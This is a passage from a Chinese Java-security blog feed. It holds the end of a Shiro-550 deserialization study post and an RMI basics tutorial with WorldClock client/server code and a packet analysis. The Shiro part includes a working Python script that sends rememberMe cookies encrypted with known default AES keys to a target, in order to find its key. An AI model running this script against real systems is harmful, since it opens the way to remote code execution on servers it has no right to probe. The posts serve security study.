punctuation">]</span> bytes <span class="token operator">=</span> <span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">readAllBytes</span><span class="token punctuation">(</span><span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"data.bin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">CookieRememberMeManager</span> cookieRememberMeManager <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CookieRememberMeManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>cookieRememberMeManager<span class="token punctuation">.</span><span class="token function">getCipherService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encrypt</span><span class="token punctuation">(</span>bytes<span class="token punctuation">,</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token string">"kPH+bIxk5D2deZiIxcaaaA=="</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>秘钥正确的情况下</p><p><img src="/../../../../../pic/image-20230202035259291.png"></p><p>秘钥错误的情况下</p><p><img src="/../../../../../pic/image-20230202035335105.png"></p><p>有大佬提前编写好的脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">import</span> uuid<span class="token keyword">import</span> requests<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES <span class="token keyword">def</span> <span class="token function">encrypt_AES_GCM</span><span class="token punctuation">(</span>msg<span class="token punctuation">,</span> secretKey<span class="token punctuation">)</span><span class="token punctuation">:</span>    aesCipher <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>secretKey<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_GCM<span class="token punctuation">)</span>    ciphertext<span class="token punctuation">,</span> authTag <span class="token operator">=</span> aesCipher<span class="token punctuation">.</span>encrypt_and_digest<span class="token punctuation">(</span>msg<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>ciphertext<span class="token punctuation">,</span> aesCipher<span class="token punctuation">.</span>nonce<span class="token punctuation">,</span> authTag<span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">encode_rememberme</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>    keys <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'kPH+bIxk5D2deZiIxcaaaA=='</span><span class="token punctuation">,</span> <span class="token string">'4AvVhmFLUs0KTA3Kprsdag=='</span><span class="token punctuation">,</span><span class="token string">'66v1O8keKNV3TTcGPK1wzg=='</span><span class="token punctuation">,</span> <span class="token string">'SDKOLKn2J1j/2BHjeZwAoQ=='</span><span class="token punctuation">]</span>     <span class="token comment"># 此处简单列举几个密钥</span>    BS <span class="token operator">=</span> AES<span class="token punctuation">.</span>block_size    pad <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span> s <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>BS <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">%</span> BS<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>BS <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">%</span> BS<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>    mode <span class="token operator">=</span> AES<span class="token punctuation">.</span>MODE_CBC    iv <span class="token operator">=</span> uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">bytes</span>     file_body <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span><span class="token string">'rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA=='</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> key <span class="token keyword">in</span> keys<span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token comment"># CBC加密</span>            encryptor <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> mode<span class="token punctuation">,</span> iv<span class="token punctuation">)</span>            base64_ciphertext <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>iv <span class="token operator">+</span> encryptor<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>pad<span class="token punctuation">(</span>file_body<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>target<span class="token punctuation">,</span> cookies<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'rememberMe'</span><span class="token punctuation">:</span> base64_ciphertext<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span>verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> res<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"Set-Cookie"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"正确KEY ："</span> <span class="token operator">+</span> key<span class="token punctuation">)</span>                <span class="token keyword">return</span> key            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token string">'rememberMe=deleteMe;'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"Set-Cookie"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"正确key:"</span> <span class="token operator">+</span> key<span class="token punctuation">)</span>                    <span class="token keyword">return</span> key            <span class="token comment"># GCM加密</span>            encryptedMsg <span class="token operator">=</span> encrypt_AES_GCM<span class="token punctuation">(</span>file_body<span class="token punctuation">,</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span>            base64_ciphertext <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>encryptedMsg<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> encryptedMsg<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> encryptedMsg<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>target<span class="token punctuation">,</span> cookies<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'rememberMe'</span><span class="token punctuation">:</span> base64_ciphertext<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>             <span class="token keyword">if</span> res<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"Set-Cookie"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"正确KEY:"</span> <span class="token operator">+</span> key<span class="token punctuation">)</span>                <span class="token keyword">return</span> key            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token string">'rememberMe=deleteMe;'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"Set-Cookie"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"正确key:"</span> <span class="token operator">+</span> key<span class="token punctuation">)</span>                    <span class="token keyword">return</span> key            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"正确key:"</span> <span class="token operator">+</span> key<span class="token punctuation">)</span>            <span class="token keyword">return</span> key        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="6-参考链接"><a href="#6-参考链接" class="headerlink" title="6. 参考链接"></a>6. 参考链接</h2><p><a href="http://wjlshare.com/archives/1542">Shiro 550 漏洞学习（一）</a></p><p><a href="http://www.lmxspace.com/2020/08/24/%E4%B8%80%E7%A7%8D%E5%8F%A6%E7%B1%BB%E7%9A%84shiro%E6%A3%80%E6%B5%8B%E6%96%B9%E5%BC%8F/">一种另类的shiro检测方式 </a></p><p><a href="https://johnfrod.top/%E5%AE%89%E5%85%A8/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">Shiro550反序列化漏洞分析</a></p>]]></content>
      
      
      <categories>
          
          <category> Java 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Shiro 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 反序列化 RMI 篇 RMI 基础</title>
      <link href="/2023/02/07/skilllearning/java-an-quan/java-fan-xu-lie-hua/rmi-pian/java-fan-xu-lie-hua-rmi-pian-rmi-ji-chu/"/>
      <url>/2023/02/07/skilllearning/java-an-quan/java-fan-xu-lie-hua/rmi-pian/java-fan-xu-lie-hua-rmi-pian-rmi-ji-chu/</url>
      
        <content type="html"><![CDATA[<h1 id="Java-反序列化-RMI-篇-RMI-基础"><a href="#Java-反序列化-RMI-篇-RMI-基础" class="headerlink" title="Java 反序列化 RMI 篇 RMI 基础"></a>Java 反序列化 RMI 篇 RMI 基础</h1><h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><p>RMI 在反序列化时也经常需要用到，在利用之前还是先了解一下 RMI 的原理</p><h2 id="2-RMI-简介"><a href="#2-RMI-简介" class="headerlink" title="2. RMI 简介"></a>2. RMI 简介</h2><p>RMI 是 Remote Method Invocation 的缩写，即远程方法调用，直白点将就是一个JVM中的代码可以通过网络实现远程调用另一个JVM的某个方法。</p><p>RMI 是基于 JRMP( Java Remote Message Protocol) Java 远程消息交换协议实现的</p><p>既然是远程调用那必然存在客户端与服务端</p><p>RMI 程序通常包括</p><ul><li><p>Registry：提供服务注册与服务获取。即Server端向Registry注册服务，比如地址、端口等一些信息，Client端从Registry获取远程对象的一些信息，如地址、端口等，然后进行远程调用。</p></li><li><p>Server：远程方法的提供者，并向Registry注册自身提供的服务</p></li><li><p>Client：远程方法的消费者，从Registry获取远程方法的相关信息并且调用</p></li></ul><p><img src="file:///E:/nah-v0.github.io/source/_posts/%E5%BA%9F%E7%A8%BF/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RMI-%E7%AF%87-RMI-%E5%9F%BA%E7%A1%80/image-20230130184659578.png?lastModify=1677743961"></p><p>RMI 的核心和独特功能之一是它能够下载对象类的定义（如果类未在接收方的 Java 虚拟机中定义）。 一个对象的所有类型和行为，以前只能在单个 Java 虚拟机中使用，现在可以传输到另一个可能是远程的 Java 虚拟机。 RMI 通过对象的实际类传递对象，因此当对象被发送到另一个 Java 虚拟机时，对象的行为不会改变。 此功能允许将新类型和行为引入远程 Java 虚拟机，从而动态扩展应用程序的行为。</p><h2 id="3-RMI-简单实现"><a href="#3-RMI-简单实现" class="headerlink" title="3. RMI 简单实现"></a>3. RMI 简单实现</h2><p>完整的 RMI 需要客户端与服务端</p><p>这里参考<a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1323711850348577">RMI远程调用</a>实现一个简单地案例，服务端提供 WorldClock 用于获取指定时区的时间</p><h3 id="3-1-RMI-服务端"><a href="#3-1-RMI-服务端" class="headerlink" title="3.1 RMI 服务端"></a>3.1 RMI 服务端</h3><p>先定义一个 Remote 类的接口</p><ul><li>WorldClock</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example<span class="token punctuation">.</span>server</span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">Remote</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">RemoteException</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>time<span class="token punctuation">.</span></span><span class="token class-name">LocalDateTime</span></span><span class="token punctuation">;</span>  <span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">WorldClock</span> <span class="token keyword">extends</span> <span class="token class-name">Remote</span> <span class="token punctuation">{</span>      <span class="token class-name">LocalDateTime</span> <span class="token function">getLocalDateTime</span><span class="token punctuation">(</span><span class="token class-name">String</span> zoneId<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">RemoteException</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​</p><p>然后是实现类</p><ul><li>WorldClockImpl</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example<span class="token punctuation">.</span>server</span><span class="token punctuation">;</span>  ​  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">RemoteException</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>time<span class="token punctuation">.</span></span><span class="token class-name">LocalDateTime</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>time<span class="token punctuation">.</span></span><span class="token class-name">ZoneId</span></span><span class="token punctuation">;</span>  ​  <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">WorldClockImpl</span> <span class="token keyword">implements</span> <span class="token class-name">WorldClock</span> <span class="token punctuation">{</span>      <span class="token annotation punctuation">@Override</span>      <span class="token keyword">public</span> <span class="token class-name">LocalDateTime</span> <span class="token function">getLocalDateTime</span><span class="token punctuation">(</span><span class="token class-name">String</span> zoneId<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">RemoteException</span> <span class="token punctuation">{</span>          <span class="token keyword">return</span> <span class="token class-name">LocalDateTime</span><span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token class-name">ZoneId</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span>zoneId<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">withNano</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​</p><p>编写服务端</p><ul><li>WorldClockServer</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example<span class="token punctuation">.</span>server</span><span class="token punctuation">;</span>  ​  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">AlreadyBoundException</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">RemoteException</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">LocateRegistry</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">Registry</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>server<span class="token punctuation">.</span></span><span class="token class-name">UnicastRemoteObject</span></span><span class="token punctuation">;</span>  ​  <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">WorldClockServer</span> <span class="token punctuation">{</span>      <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">RemoteException</span><span class="token punctuation">,</span> <span class="token class-name">AlreadyBoundException</span> <span class="token punctuation">{</span>          <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"create World clock remote service..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">// 实例化一个WorldClock:  </span>        <span class="token class-name">WorldClockImpl</span> worldClockImpl <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WorldClockImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">// 将此服务转换为远程服务接口:  </span>        <span class="token class-name">WorldClock</span> skeleton <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">WorldClock</span><span class="token punctuation">)</span> <span class="token class-name">UnicastRemoteObject</span><span class="token punctuation">.</span><span class="token function">exportObject</span><span class="token punctuation">(</span>worldClockImpl<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">// 将RMI服务注册到1099端口:  </span>        <span class="token class-name">Registry</span> registry <span class="token operator">=</span> <span class="token class-name">LocateRegistry</span><span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">// 注册此服务，服务名为"WorldClock":  </span>        registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"WorldClock"</span><span class="token punctuation">,</span> skeleton<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  ​<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-2-RMI-客服端"><a href="#3-2-RMI-客服端" class="headerlink" title="3.2 RMI 客服端"></a>3.2 RMI 客服端</h3><p>客户端要做的只有从服务端获取远程对象然后调用其对应的方法，实例化远程对象前提本地还是要有一个对应的接口</p><ul><li>WorldClock</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example<span class="token punctuation">.</span>client</span><span class="token punctuation">;</span>  ​  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">Remote</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">RemoteException</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>time<span class="token punctuation">.</span></span><span class="token class-name">LocalDateTime</span></span><span class="token punctuation">;</span>  ​  <span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">WorldClock</span> <span class="token keyword">extends</span> <span class="token class-name">Remote</span> <span class="token punctuation">{</span>      <span class="token class-name">LocalDateTime</span> <span class="token function">getLocalDateTime</span><span class="token punctuation">(</span><span class="token class-name">String</span> zoneId<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">RemoteException</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​</p><p>然后编写客户端代码获取远程类</p><ul><li>WorldClockClient</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example<span class="token punctuation">.</span>client</span><span class="token punctuation">;</span>  ​  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>example<span class="token punctuation">.</span>server<span class="token punctuation">.</span></span><span class="token class-name">WorldClock</span></span><span class="token punctuation">;</span>  ​  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">NotBoundException</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">RemoteException</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">LocateRegistry</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">Registry</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>time<span class="token punctuation">.</span></span><span class="token class-name">LocalDateTime</span></span><span class="token punctuation">;</span>  ​  <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">WorldClockClient</span> <span class="token punctuation">{</span>      <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">RemoteException</span><span class="token punctuation">,</span> <span class="token class-name">NotBoundException</span> <span class="token punctuation">{</span>          <span class="token comment">// 连接到服务器localhost，端口1099:  </span>        <span class="token class-name">Registry</span> registry <span class="token operator">=</span> <span class="token class-name">LocateRegistry</span><span class="token punctuation">.</span><span class="token function">getRegistry</span><span class="token punctuation">(</span><span class="token string">"localhost"</span><span class="token punctuation">,</span> <span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">// 查找名称为"WorldClock"的服务并强制转型为WorldClock接口:  </span>        <span class="token class-name">WorldClock</span> worldClock <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">WorldClock</span><span class="token punctuation">)</span> registry<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">"WorldClock"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">// 正常调用接口方法:  </span>        <span class="token class-name">LocalDateTime</span> now <span class="token operator">=</span> worldClock<span class="token punctuation">.</span><span class="token function">getLocalDateTime</span><span class="token punctuation">(</span><span class="token string">"Asia/Shanghai"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">// 打印调用结果:  </span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>now<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​</p><p>分别运行客户端与服务端代码</p><p>运行结果</p><p><img src="file:///E:/nah-v0.github.io/source/_posts/%E5%BA%9F%E7%A8%BF/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RMI-%E7%AF%87-RMI-%E5%9F%BA%E7%A1%80/image-20230131031224678.png?lastModify=1677743961"></p><h2 id="4-通过-Wireshark-抓包分析-RMI-通信原理"><a href="#4-通过-Wireshark-抓包分析-RMI-通信原理" class="headerlink" title="4. 通过 Wireshark 抓包分析 RMI 通信原理"></a>4. 通过 Wireshark 抓包分析 RMI 通信原理</h2><p>还是跟着师傅研究复现一下</p><h3 id="4-1-Client-向-Registry-1099端口-建立通讯"><a href="#4-1-Client-向-Registry-1099端口-建立通讯" class="headerlink" title="4.1 Client 向 Registry(1099端口)建立通讯"></a>4.1 Client 向 Registry(1099端口)建立通讯</h3><p>前面几个包用于确定通讯协议啥的就调过了，直接从 Call 开始看</p><p><img src="file:///E:/nah-v0.github.io/source/_posts/%E5%BA%9F%E7%A8%BF/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RMI-%E7%AF%87-RMI-%E5%9F%BA%E7%A1%80/image-20230131040746731.png?lastModify=1677743961"></p><p>传输了一个序列化内容，可以看到包含我们请求调用的远程类</p><p><img src="file:///E:/nah-v0.github.io/source/_posts/%E5%BA%9F%E7%A8%BF/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RMI-%E7%AF%87-RMI-%E5%9F%BA%E7%A1%80/image-20230131041439669.png?lastModify=1677743961"></p><p>随后客户端返回对应类的提供者，然后客户端另起一个端口与返回的地址进行通讯</p><h3 id="4-2-Client-向-Server-获取到的-2887-端口-建立通讯"><a href="#4-2-Client-向-Server-获取到的-2887-端口-建立通讯" class="headerlink" title="4.2 Client 向 Server(获取到的 2887 端口) 建立通讯"></a>4.2 Client 向 Server(获取到的 2887 端口) 建立通讯</h3><p>这里 Wireshark 并没有识别出来为 RMI 协议</p><p><img src="file:///E:/nah-v0.github.io/source/_posts/%E5%BA%9F%E7%A8%BF/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RMI-%E7%AF%87-RMI-%E5%9F%BA%E7%A1%80/image-20230131042420146.png?lastModify=1677743961"></p><p>大概就是客户端请求自己所需要的远程对象，然后客户端返回一个</p><p>翻译为代码的话</p><p>Registry registry = LocateRegistry.getRegistry(“127.0.0.1”, 1099);<br>WorldClock worldClock = (WorldClock) registry.lookup(“WorldClock”);</p><h3 id="4-3-Client-向-Server-传递参数"><a href="#4-3-Client-向-Server-传递参数" class="headerlink" title="4.3 Client 向 Server 传递参数"></a>4.3 Client 向 Server 传递参数</h3><p><img src="file:///E:/nah-v0.github.io/source/_posts/%E5%BA%9F%E7%A8%BF/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RMI-%E7%AF%87-RMI-%E5%9F%BA%E7%A1%80/image-20230131044729675.png?lastModify=1677743961"></p><p>这一步实现的就是</p><p>LocalDateTime now = worldClock.getLocalDateTime(“Asia/Shanghai”);</p><p>在通信过程中使用序列化进行传递参数，相对应的本地应该也存在反序列化操作，那么这个反序列化操作我们能否从中插一脚呢</p>]]></content>
      
      
      <categories>
          
          <category> Java 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RMI 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 反序列化 Fastjson 篇 基本原理</title>
